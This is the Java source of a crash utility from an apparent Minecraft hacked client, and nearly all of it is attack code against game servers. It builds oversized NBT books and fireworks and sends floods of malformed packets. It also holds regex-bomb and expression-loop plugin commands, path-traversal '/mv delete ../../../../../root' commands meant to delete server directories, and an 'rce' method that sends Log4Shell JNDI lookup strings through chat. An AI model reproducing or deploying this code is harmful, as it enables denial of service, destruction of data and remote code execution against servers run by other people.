package cn.loli.client.utils.misc;

import cn.loli.client.Main;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.*;
import net.minecraft.util.BlockPos;
import net.minecraft.util.EnumFacing;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.Arrays;
import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;

public class CrashUtils {

    public String[] unicode = {"م",
            "⾟", "✈", "龜", "樓", "ᳱ", "ᳩ", "ᳫ", "ᳬ", "᳭", "ᳮ", "ᳯ", "ᳰ", "⿓", "⿕",
            "⿔", "\uD803\uDE60", "\uD803\uDE65", "ᮚ", "ꩶ", "꩷", "㉄", "Ὦ", "Ἇ", "ꬱ",
            "ꭑ", "ꭐ", "\uAB67", "ɸ", "Ａ", "\u007F"}; //31

    public String lpx = "...................................................Ѳ2.6602355499702653E8"; //12;

    public String netty = "........................................................................................................................." +
            "............................................................................................................................................" +
            "................................................................................................................................................" +
            "...................................................................................................................................................." +
            "...................................................................................................................................................." +
            "....................................................................................................................................................." +
            "......................................................................................................................................................" +
            "......................................................................................................................................................." +
            "........................................................................"; //12


    String[] buffertype = {"MC|BSign", "MC|BEdit", "MC|BOpen"};

    public String pexcrashexp1 = "/pex promote a a";
    public String pexcrashexp2 = "/pex promote b b";
    public String mv = "/multiverse-core:Mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^";
    public String fawe = "/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}";

    public String[] oldmv = {"/mv import ../../../../../home normal -t flat",
            "/mv import ../../../../../root normal -t flat",
            "/mv delete ../../../../../home",
            "/mv confirm",
            "/mv delete ../../../../../root",
            "/mv confirm"};


    public String[] moon = {"{\"theresa.exe\":\"${jndi:rmi://du.pa}\"}}", "{\"pdw\"}", "[\"damn man\"]", "{\"such a gay rn\"}"};

    public String AlphabeticRandom(int count) {
        return RandomStringUtils.randomAlphabetic(count);
    }

    public String NumberRandom(int count) {
        return RandomStringUtils.randomNumeric(count);
    }

    public String AsciirRandom(int count) {
        return RandomStringUtils.randomAscii(count);
    }

    public void oneblockcrash(ItemStack stack) {
        Main.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement
                (new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - new Random().nextFloat() - 1.0f, Minecraft.getMinecraft().thePlayer.posZ)
                        , new Random().nextInt(255), stack, 0.0f, 0.0f, 0.0f));
    }

    public void placecrash(ItemStack stack) {
        Main.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement(stack));
    }

    public void placecrash2(ItemStack stack) {
        Main.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement
                (new BlockPos(Double.MAX_VALUE, 1.0, Double.MAX_VALUE)
                        , Integer.MAX_VALUE, stack, Integer.MAX_VALUE, 1.0F, Integer.MAX_VALUE));
    }

    public void payload1(ItemStack stack) {
        String channel;
        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeItemStackToBuffer(stack);
        channel = "MC|BEdit";
        Main.INSTANCE.packetQueue.add(new C17PacketCustomPayload(channel, packetBuffer));
    }

    public void payload2(ItemStack stack) {
        String channel;
        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeItemStackToBuffer(stack);
        channel = buffertype[0];
        Main.INSTANCE.packetQueue.add(new C17PacketCustomPayload(channel, packetBuffer));
    }

    public void creatandpayload(ItemStack stack) {
        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeItemStackToBuffer(stack);
        Main.INSTANCE.packetQueue.add(new C10PacketCreativeInventoryAction(36, stack));
        Main.INSTANCE.packetQueue.add(new C17PacketCustomPayload("MC|BEdit", packetBuffer));
    }

    public void creatandplace(ItemStack stack) {
        Main.INSTANCE.packetQueue.add(new C10PacketCreativeInventoryAction(36, stack));
        Main.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement
                (new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - new Random().nextFloat() - 1.0f, Minecraft.getMinecraft().thePlayer.posZ)
                        , new Random().nextInt(255), stack, 0.0f, 0.0f, 0.0f));
    }

    public void click(ItemStack stack) {
        Main.INSTANCE.packetQueue.add(new C0EPacketClickWindow
                (0, 0, 0, 1, stack, (short) 0));
    }

    public void click2(ItemStack stack) {
        Main.INSTANCE.packetQueue.add(new C0EPacketClickWindow
                (0, 0, 0, 0, stack, (short) 0));
    }

    public void click3(ItemStack stack) {
        Main.INSTANCE.packetQueue.add(new C0EPacketClickWindow
                (0, -999, 0, 5, stack, (short) 0));
    }

    public void creatandclick(ItemStack stack) {
        Main.INSTANCE.packetQueue.add(new C10PacketCreativeInventoryAction(36, stack));
        Main.INSTANCE.packetQueue.add(new C0EPacketClickWindow(0, Integer.MIN_VALUE, 0, 3, stack, (short) 0));
    }

    public void justcreate(ItemStack stack) {
        Main.INSTANCE.packetQueue.add(new C10PacketCreativeInventoryAction
                (new Random().nextInt(Integer.MAX_VALUE), stack));
    }

    public void custombyte(int amount) {
        double x = Minecraft.getMinecraft().thePlayer.posX, y = Minecraft.getMinecraft().thePlayer.posY, z = Minecraft.getMinecraft().thePlayer.posZ;
        for (int j = 0; j < amount; j++) {
            double i = ThreadLocalRandom.current().nextDouble(0.4, 1.2);
            if (y > 255) y = 255;
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, false));
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, true));
        }
    }

    public void crashdemo(String sign, int item, int bookvalue, int redo, int json, CrashType type, int amount, int resolvebyte) {
        NBTTagCompound compound = new NBTTagCompound();
        NBTTagList tagList = new NBTTagList();
        StringBuilder builder = new StringBuilder();
        Item hold;

        switch (item) {
            case 0:
                hold = Items.writable_book;
                break;
            case 1:
            default:
                hold = Items.written_book;
        }

        switch (json) {
            case 0:
                builder.append("{");
                for (int size = 0; size < bookvalue; ++size) {
                    builder.append("extra:[{");
                }
                for (int size = 0; size < bookvalue; ++size) {
                    builder.append("text:").append(sign).append("}],");
                }
                builder.append("text:").append(sign).append("}");
                break;
            case 1:
                for (int size = 0; size < bookvalue; ++size) {
                    builder.append("{translate:chat.type.text,with:[");
                }
                builder.append("{").append("text:").append(sign);
                for (int size = 0; size < bookvalue; ++size) {
                    builder.append("}]");
                }
                builder.append("}");
                break;
            case 2:
                for (int size = 0; size < bookvalue; ++size)
                    builder.append(sign);
        }


        for (int size = 0; size < redo; ++size)
            tagList.appendTag(new NBTTagString(builder.toString()));

        compound.setString("author", Minecraft.getMinecraft().getSession().getUsername());
        compound.setString("title", "Theresa-Cute" + AlphabeticRandom(2));
        compound.setByte("resolved", (byte) resolvebyte);
        compound.setTag("pages", tagList);


        ItemStack stack = new ItemStack(hold);
        stack.setTagInfo("pages", tagList);
        stack.setTagCompound(compound);

        int packet = 0;

        while (packet++ < amount) {
            switch (type) {
                case PLACE:
                    oneblockcrash(stack);
                    break;
                case CLICK:
                    click(stack);
                    break;
                case PAYLOAD1:
                    payload1(stack);
                    break;
                case PAYLOAD2:
                    payload2(stack);
                    break;
                case CAP:
                    creatandplace(stack);
                    break;
                case CAC:
                    creatandclick(stack);
                    break;
                case CAPL:
                    creatandpayload(stack);
                    break;
                case CREATE:
                    justcreate(stack);
                    break;
                case PLACE2:
                    placecrash(stack);
                    break;
                case PLACE3:
                    placecrash2(stack);
                    break;
                case CLICK2:
                    click2(stack);
                    break;
                case CLICK3:
                    click3(stack);
                    break;
            }
        }
    }

    public void actioncrash(int amount, int range) {
        int init = 0;
        while (init < amount) {
            final BlockPos blockPos = Minecraft.getMinecraft().thePlayer.getPosition().add(getRandomInteger(-10, 10),
                    getRandomInteger(-15, 15), getRandomInteger(-10, 10));
            Main.INSTANCE.packetQueue.add(new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.STOP_DESTROY_BLOCK, blockPos, EnumFacing.DOWN));
            init++;
        }
    }


    public void action2crash(int amount, int range) {
        int init = 0;
        while (init < amount) {
            for (int i = 0; i < range; i++)
                Minecraft.getMinecraft().playerController.windowClick(Minecraft.getMinecraft().thePlayer.openContainer.windowId,
                        i, 0, 0, Minecraft.getMinecraft().thePlayer);
            init++;
        }
    }

    public void aac5crash(int amount) {
        int init = 0;
        while (init < amount) {
            Main.INSTANCE.packetQueue.add(new C03PacketPlayer.C04PacketPlayerPosition(1.7e+301, -999, 0, true));
            init++;
        }
    }

    public void rce(int amount) {
        int init = 0;

        NBTTagCompound comp = new NBTTagCompound();
        NBTTagList list = new NBTTagList();
        for (int i2 = 0; i2 < 1; i2++)
            list.appendTag(new NBTTagString("{\"petya.exe\":\"${jndi:rmi://google.com/a}\", \"petya.exe\":\"${jndi:rmi://google.com/a}\"x}}"));
        comp.setString("author", Minecraft.getMinecraft().getSession().getUsername());
        comp.setString("title", "null");
        comp.setByte("resolved", (byte) 1);
        comp.setTag("pages", list);
        ItemStack stack = new ItemStack(Items.writable_book);
        stack.setTagCompound(comp);
        PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
        buffer.writeItemStackToBuffer(stack);

        while (init < amount) {
            Main.INSTANCE.packetQueue.add(new C01PacketChatMessage("{\"petya.exe\":\"${jndi:rmi://google.com/a}\", \"petya.exe\":\"${jndi:rmi://google.com/a}\"x}}"));
            init++;
        }
    }


    public void firework(int amount, CrashType type) {

        ItemStack stack = new ItemStack(Items.fireworks);
        final NBTTagCompound outerTag = new NBTTagCompound();
        final NBTTagCompound tag2 = new NBTTagCompound();
        final NBTTagList list2 = new NBTTagList();
        final int[] arr = new int[64];
        for (int k = 0; k < 3260; ++k) {
            Arrays.fill(arr, k + 1);
            final NBTTagCompound explosion = new NBTTagCompound();
            explosion.setIntArray("Colors", arr);
            list2.appendTag(explosion);
        }
        tag2.setTag("Explosions", list2);
        tag2.setInteger("Flight", Integer.MAX_VALUE);
        outerTag.setTag("Fireworks", tag2);
        stack.setTagCompound(outerTag);

        int packet = 0;

        while (packet++ < amount) {
            switch (type) {
                case PLACE:
                    oneblockcrash(stack);
                    break;
                case CLICK:
                    click(stack);
                    break;
                case CAP:
                    creatandplace(stack);
                    break;
                case CAC:
                    creatandclick(stack);
                    break;
                case CAPL:
                    creatandpayload(stack);
                    break;
                case CREATE:
                    justcreate(stack);
                    break;
                case PLACE2:
                    placecrash(stack);
                    break;
                case PLACE3:
                    placecrash2(stack);
                    break;
                case CLICK2:
                    click2(stack);
                    break;
                case CLICK3:
                    click3(stack);
                    break;
            }
        }
    }


    public enum CrashType {
        PLACE, PLACE2, PLACE3, CLICK, CLICK2, CLICK3, PAYLOAD1, PAYLOAD2, CAP, CAC, CAPL, CREATE, SIGN,
    }


    //TODO: GUI For Crasher // Multi Tags Crasher // Non Book Make Crasher
    //PlayerUtil.debug(Main.INSTANCE.aesUtil.AESEncode(String.valueOf(packetBuffer))); Thread.sleep(delay);


    private final ThreadLocalRandom threadLocalRandom = ThreadLocalRandom.current();

    private double getRandomDouble(double min, double max) {
        return threadLocalRandom.nextDouble(min, max);
    }

    private int getRandomInteger(int min, int max) {
        return threadLocalRandom.nextInt(min, max);
    }

    private double getRandomGaussian(double average) {
        return threadLocalRandom.nextGaussian() * average;
    }

    private float getRandomFloat(float min, float max) {
        return (float) threadLocalRandom.nextDouble(min, max);
    }

    private double smooth(double max, double min, double time, boolean randomizing, double randomStrength) {
        min += 1;
        double radians = Math.toRadians((System.currentTimeMillis() * time % 360) - 180);
        double base = (Math.tanh(radians) + 1) / 2;
        double delta = max - min;
        delta *= base;
        double value = min + delta;
        if (randomizing) value *= ThreadLocalRandom.current().nextDouble(randomStrength, 1);
        return Math.ceil(value * 1000) / 1000;
    }


}
